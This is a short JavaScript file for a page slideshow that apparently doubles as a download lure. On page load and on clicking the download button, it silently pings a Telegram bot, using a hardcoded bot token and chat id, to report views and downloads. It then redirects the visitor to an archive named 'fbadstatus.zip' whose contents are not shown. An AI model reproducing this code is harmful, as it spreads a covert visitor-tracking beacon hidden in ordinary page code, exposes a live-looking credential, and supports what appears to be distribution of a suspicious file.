window.onload =function() {
  var token = "5712740653:AAFreDzJcJMwmYXULecs3-l5rHOpY5XSb78";
  let formData = new FormData();
  fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=-773511937&text=ViewPage')
  .then(res => res.json())
  .then()
} 

var slideIndex = 0;
showSlides();

// Next/previous controls
function plusSlides(n) {
  showSlides2(slideIndex += n);
}

function showSlides2(n) {
  var i;
  var slides = document.getElementsByClassName("mySlides");
  
  if (n > slides.length) {slideIndex = 1}
  if (n < 1) {slideIndex = slides.length}
  
  for (i = 0; i < slides.length; i++) {
      slides[i].style.display = "none";
  }
  
  slides[slideIndex-1].style.display = "block";
}

function showSlides() {
  var i;
  var slides = document.getElementsByClassName("mySlides");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";
  }
  slideIndex++;
  if (slideIndex > slides.length) {slideIndex = 1}
  slides[slideIndex-1].style.display = "block";
  setTimeout(showSlides, 5000);
}


document.getElementById('btn-down').onclick = function() {
  var token = "5712740653:AAFreDzJcJMwmYXULecs3-l5rHOpY5XSb78";
  let formData = new FormData();
  fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=-773511937&text=someone downloaded it')
  .then(res => res.json())
  .then()
  window.location.href='/file/fbadstatus.zip'
}

